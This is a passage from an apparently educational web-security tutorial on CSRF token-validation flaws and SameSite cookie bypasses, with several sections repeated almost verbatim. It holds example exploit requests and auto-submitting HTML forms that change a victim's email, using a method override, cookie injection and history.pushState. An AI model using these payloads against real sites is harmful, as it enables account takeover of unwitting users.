        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
</span></pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="3-referer-based-validation"><span class="me-2">3. <strong>Referer-Based Validation</strong></span><a href="#3-referer-based-validation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Some applications use the <strong>Referer</strong> header to check if a request originates from the application’s own domain. This prevents cross-site requests, but it’s generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.</p>

<hr />

<h2 id="bypassing-samesite-lax-restrictions-using-get-requests"><span class="me-2"><strong>Bypassing SameSite Lax Restrictions Using GET Requests</strong></span><a href="#bypassing-samesite-lax-restrictions-using-get-requests" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Even with <strong>Lax</strong> SameSite restrictions, attackers can still perform CSRF attacks if the server allows <strong>GET requests</strong> to trigger sensitive actions. For example:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/email/change?email=pwned@evil-user.net</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.</p>

<hr />

<h3 id="example-of-bypassing-csrf-token-validation"><span class="me-2">Example of Bypassing CSRF Token Validation</span><a href="#example-of-bypassing-csrf-token-validation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>If the application validates the CSRF token only if it is present in the request, attackers can exploit this by simply removing the token parameter from the request. For example:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">25</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>

email=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERE
</pre></td></tr></tbody></table></code></div></div>

<p>Since the CSRF token is not present, and if the application doesn’t enforce checks for the missing token, the attacker can still perform the malicious action.</p>

<h1 id="common-flaws-in-csrf-token-validation-and-advanced-bypass-techniques">Common Flaws in CSRF Token Validation and Advanced Bypass Techniques</h1>

<h2 id="common-flaws-in-csrf-token-validation"><span class="me-2"><strong>Common Flaws in CSRF Token Validation</strong></span><a href="#common-flaws-in-csrf-token-validation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Even when applications implement CSRF tokens, improper validation can render the defense ineffective. Below are some common flaws that attackers can exploit to bypass CSRF protection:</p>

<hr />

<h3 id="1-validation-of-csrf-token-depends-on-request-method"><span class="me-2">1. <strong>Validation of CSRF Token Depends on Request Method</strong></span><a href="#1-validation-of-csrf-token-depends-on-request-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In some applications, CSRF token validation is only enforced when the request uses the <strong>POST</strong> method but is skipped for <strong>GET</strong> requests. This can lead to vulnerabilities because GET requests can still modify user data or perform sensitive actions without triggering token checks.</p>

<h4 id="example-exploit"><span class="me-2">Example Exploit:</span><a href="#example-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>An attacker can exploit this by switching to the <strong>GET method</strong>, which doesn’t trigger token validation. For example, the following request could bypass CSRF protection:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/email/change?email=pwned@evil-user.net</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Here, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform a malicious action (like changing the email) without being detected.</p>

<hr />

<h3 id="2-validation-of-csrf-token-depends-on-token-being-present"><span class="me-2">2. <strong>Validation of CSRF Token Depends on Token Being Present</strong></span><a href="#2-validation-of-csrf-token-depends-on-token-being-present" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Another common flaw occurs when applications validate the CSRF token <strong>only if it is present</strong> in the request. If the token is omitted, some applications may skip validation entirely.</p>

<h4 id="example-exploit-1"><span class="me-2">Example Exploit:</span><a href="#example-exploit-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>An attacker can exploit this vulnerability by simply removing the token parameter from the request. Since no token is included, the application may fail to validate the absence of the token, allowing the attacker to carry out a CSRF attack.</p>

<p>For example, an attacker could send the following request, omitting the CSRF token:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">25</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>

email=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERE
</pre></td></tr></tbody></table></code></div></div>

<p>Since the CSRF token is not present, and if the application doesn’t enforce any checks for the missing token, the attacker can still perform the malicious action, such as changing the user’s email address, without being blocked.</p>

<hr />

<h3 id="3-csrf-token-is-not-tied-to-the-user-session"><span class="me-2">3. <strong>CSRF Token is Not Tied to the User Session</strong></span><a href="#3-csrf-token-is-not-tied-to-the-user-session" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>A critical flaw in some applications is the failure to ensure that the CSRF token belongs to the same session as the user making the request. Instead of validating that the token is unique to the user session, the application may accept any token from a global pool of previously issued tokens.</p>

<h4 id="how-the-attack-works"><span class="me-2">How the Attack Works:</span><a href="#how-the-attack-works" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ol>
  <li>The attacker logs into the application with their own account, obtaining a valid CSRF token tied to their session.</li>
  <li>The attacker then creates a malicious CSRF request and includes the valid token obtained from their own session.</li>
  <li>The attacker sends this request to a victim, hoping the victim will unknowingly trigger the request while logged into the vulnerable application.</li>
  <li>Because the application only checks if the CSRF token is valid (without verifying whether it matches the victim’s session), the attack can succeed, allowing the attacker to perform actions on behalf of the victim.</li>
</ol>

<h4 id="example"><span class="me-2">Example:</span><a href="#example" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">68</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=victim-session-id</span>

csrf=attacker-csrf-token&amp;email=pwned@evil-user.net
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="4-csrf-token-is-tied-to-a-non-session-cookie"><span class="me-2">4. <strong>CSRF Token is Tied to a Non-Session Cookie</strong></span><a href="#4-csrf-token-is-tied-to-a-non-session-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In some cases, instead of tying the CSRF token to the session (which is secure), the application ties the CSRF token to a <strong>different cookie</strong> that is not used for session tracking. This can happen when:</p>

<ol>
  <li>The application uses separate frameworks for session management and CSRF protection.</li>
  <li>These frameworks are not properly integrated, so they don’t share the same session state.</li>
</ol>

<h4 id="example-request"><span class="me-2">Example Request:</span><a href="#example-request" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">68</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span>

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">session</code> cookie (<code class="language-plaintext highlighter-rouge">pSJYSScWKpmC60LpFOAHKixuFuM4uXWF</code>) tracks the user’s session.</li>
  <li>The <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie (<code class="language-plaintext highlighter-rouge">rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</code>) is used to validate the CSRF token (<code class="language-plaintext highlighter-rouge">RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY</code>).</li>
</ul>

<p>Notice that the CSRF token is validated against the <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie, <strong>not the session cookie</strong>.</p>

<h4 id="why-is-this-vulnerable"><span class="me-2">Why Is This Vulnerable?</span><a href="#why-is-this-vulnerable" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>This setup is vulnerable because the CSRF token is no longer tightly coupled with the user’s session. Instead, it depends on a separate cookie (<code class="language-plaintext highlighter-rouge">csrfKey</code>). If an attacker can manipulate this cookie, they can bypass the CSRF protection.</p>

<h4 id="how-can-an-attacker-exploit-this"><span class="me-2">How Can an Attacker Exploit This?</span><a href="#how-can-an-attacker-exploit-this" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ol>
  <li><strong>Obtain a Valid CSRF Token and Associated Cookie:</strong>
    <ul>
      <li>The attacker logs into their own account on the application.</li>
      <li>They obtain a valid CSRF token and its corresponding <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie.</li>
    </ul>
  </li>
  <li><strong>Set the Attacker’s <code class="language-plaintext highlighter-rouge">csrfKey</code> Cookie in the Victim’s Browser:</strong>
    <ul>
      <li>If the application has any functionality that allows setting cookies (e.g., via JavaScript, HTTP headers, or another subdomain), the attacker can exploit this to set their <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie in the victim’s browser.</li>
      <li>For example:
        <ul>
          <li>A cookie-setting function on <code class="language-plaintext highlighter-rouge">staging.demo.normal-website.com</code> could set a cookie that is submitted to <code class="language-plaintext highlighter-rouge">secure.normal-website.com</code>.</li>
          <li>The attacker leverages this behavior to place their <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie in the victim’s browser.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>Craft a Malicious CSRF Request:</strong>
    <ul>
      <li>The attacker creates a malicious request (e.g., changing the victim’s email address) and includes their valid CSRF token.</li>
      <li>When the victim’s browser sends the request, it includes:
        <ul>
          <li>The attacker’s <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie (set earlier).</li>
          <li>The attacker’s valid CSRF token (included in the malicious request).</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>Bypass CSRF Protection:</strong>
    <ul>
      <li>The server validates the CSRF token against the <code class="language-plaintext highlighter-rouge">csrfKey</code> cookie.</li>
      <li>Since both the token and cookie belong to the attacker, the validation passes.</li>
      <li>The server processes the request as if it came from the victim, even though the victim did not intend to perform the action.</li>
    </ul>
  </li>
</ol>

<hr />

<h3 id="5-csrf-token-is-simply-duplicated-in-a-cookie"><span class="me-2">5. <strong>CSRF Token is Simply Duplicated in a Cookie</strong></span><a href="#5-csrf-token-is-simply-duplicated-in-a-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>In a variation of the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the “double submit” defense against CSRF.</p>

<h4 id="example-request-1"><span class="me-2">Example Request:</span><a href="#example-request-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/email/change</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">68</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa</span>

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
</pre></td></tr></tbody></table></code></div></div>

<h4 id="why-is-this-vulnerable-1"><span class="me-2">Why Is This Vulnerable?</span><a href="#why-is-this-vulnerable-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The attacker can again perform a CSRF attack if the website contains any cookie-setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.</p>

<h4 id="example-exploit-2"><span class="me-2">Example Exploit:</span><a href="#example-exploit-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">csrf=abcd1234</span><span class="dl">"</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"abcd1234"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h2 id="advanced-techniques-for-bypassing-csrf-defenses"><span class="me-2"><strong>Advanced Techniques for Bypassing CSRF Defenses</strong></span><a href="#advanced-techniques-for-bypassing-csrf-defenses" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="1-bypassing-samesite-lax-restrictions-using-get-requests"><span class="me-2">1. <strong>Bypassing SameSite Lax Restrictions Using GET Requests</strong></span><a href="#1-bypassing-samesite-lax-restrictions-using-get-requests" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Even with <strong>Lax</strong> SameSite restrictions, attackers can still perform CSRF attacks if the server allows <strong>GET requests</strong> to trigger sensitive actions. For example:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/email/change?email=pwned@evil-user.net</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.</p>

<hr />

<h3 id="2-using-historypushstate-to-mask-the-attack"><span class="me-2">2. <strong>Using <code class="language-plaintext highlighter-rouge">history.pushState</code> to Mask the Attack</strong></span><a href="#2-using-historypushstate-to-mask-the-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Attackers can use the <code class="language-plaintext highlighter-rouge">history.pushState</code> function to modify the browser’s URL history and mask the attack. This can help avoid detection by users or security tools.</p>

<h4 id="example-exploit-3"><span class="me-2">Example Exploit:</span><a href="#example-exploit-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_method"</span> <span class="na">value=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h1 id="samesite-cookie-restrictions-and-bypass-techniques">SameSite Cookie Restrictions and Bypass Techniques</h1>

<h2 id="what-is-samesite-in-the-context-of-cookies"><span class="me-2"><strong>What is SameSite in the Context of Cookies?</strong></span><a href="#what-is-samesite-in-the-context-of-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><strong>SameSite</strong> is a browser security mechanism that determines when a website’s cookies are included in requests originating from other websites. It provides partial protection against a variety of cross-site attacks, including:</p>

<ul>
  <li><strong>CSRF (Cross-Site Request Forgery)</strong></li>
  <li><strong>Cross-Site Leaks</strong></li>
  <li><strong>Some CORS (Cross-Origin Resource Sharing) Exploits</strong></li>
</ul>

<p>Since 2021, <strong>Chrome</strong> applies <code class="language-plaintext highlighter-rouge">Lax</code> SameSite restrictions by default if the website that issues the cookie doesn’t explicitly set its own restriction level. This is a proposed standard, and other major browsers are expected to adopt this behavior in the future. As a result, it’s essential to understand how these restrictions work, as well as how they can potentially be bypassed.</p>

<hr />

<h3 id="how-does-samesite-work"><span class="me-2"><strong>How Does SameSite Work?</strong></span><a href="#how-does-samesite-work" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>SameSite allows website owners to restrict cookie sharing based on three levels:</p>

<ol>
  <li><strong>Strict</strong>:
    <ul>
      <li>Cookies are only sent in a first-party context, meaning they won’t be included in any cross-site requests.</li>
      <li>This provides the strongest protection but may break functionality for users navigating between sites.</li>
    </ul>
  </li>
  <li><strong>Lax</strong>:
    <ul>
      <li>Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).</li>
      <li>This offers a balance between security and usability.</li>
    </ul>
  </li>
  <li><strong>None</strong>:
    <ul>
      <li>Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure” (i.e., transmitted over HTTPS).</li>
    </ul>
  </li>
</ol>

<p>By limiting when cookies are sent, SameSite reduces the risk of CSRF attacks, where attackers trick a user’s browser into making unauthorized requests using their authenticated session.</p>

<hr />

<h4 id="setting-samesite-attributes"><span class="me-2"><strong>Setting SameSite Attributes</strong></span><a href="#setting-samesite-attributes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Developers can manually configure a restriction level for each cookie they set by including the <code class="language-plaintext highlighter-rouge">SameSite</code> attribute in the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> response header, along with their preferred value:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
</span></pre></td></tr></tbody></table></code></div></div>

<p>If the website issuing the cookie doesn’t explicitly set a <code class="language-plaintext highlighter-rouge">SameSite</code> attribute, Chrome automatically applies <code class="language-plaintext highlighter-rouge">Lax</code> restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.</p>

<hr />

<h3 id="bypassing-samesite-lax-restrictions-using-get-requests-1"><span class="me-2"><strong>Bypassing SameSite Lax Restrictions Using GET Requests</strong></span><a href="#bypassing-samesite-lax-restrictions-using-get-requests-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Even with <strong>Lax</strong> SameSite restrictions, attackers can still perform CSRF attacks if the server allows <strong>GET requests</strong> to trigger sensitive actions. For example:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/email/change?email=pwned@evil-user.net</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">vulnerable-website.com</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.</p>

<hr />

<h3 id="using-_method-parameter-to-override-http-methods"><span class="me-2"><strong>Using <code class="language-plaintext highlighter-rouge">_method</code> Parameter to Override HTTP Methods</strong></span><a href="#using-_method-parameter-to-override-http-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Some frameworks allow overriding the HTTP method specified in the request line. For example, <strong>Symfony</strong> supports the <code class="language-plaintext highlighter-rouge">_method</code> parameter in forms, which takes precedence over the normal method for routing purposes.</p>

<h4 id="example-exploit-4"><span class="me-2">Example Exploit:</span><a href="#example-exploit-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_method"</span> <span class="na">value=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Here’s what happens in this exploit:</p>

<ol>
  <li><strong><code class="language-plaintext highlighter-rouge">history.pushState</code></strong>:
    <ul>
      <li>The <code class="language-plaintext highlighter-rouge">history.pushState</code> function modifies the browser’s history and URL without reloading the page. In this case, it changes the URL path to <code class="language-plaintext highlighter-rouge">/</code>, which may help mask the attack or avoid detection.</li>
    </ul>
  </li>
  <li><strong>Form Action</strong>:
    <ul>
      <li>The form’s <code class="language-plaintext highlighter-rouge">action</code> attribute points to the target endpoint: <code class="language-plaintext highlighter-rouge">https://vulnerable-website.com/email/change</code>.</li>
      <li>This is the URL where the malicious request will be sent.</li>
    </ul>
  </li>
  <li><strong>Hidden Input Fields</strong>:
    <ul>
      <li>The form includes hidden input fields:
        <ul>
          <li><code class="language-plaintext highlighter-rouge">_method</code>: Overrides the HTTP method to <code class="language-plaintext highlighter-rouge">GET</code> (useful if the server accepts method overrides).</li>
          <li><code class="language-plaintext highlighter-rouge">email</code>: Sets the victim’s email to <code class="language-plaintext highlighter-rouge">pwned@evil-user.net</code>.</li>
        </ul>
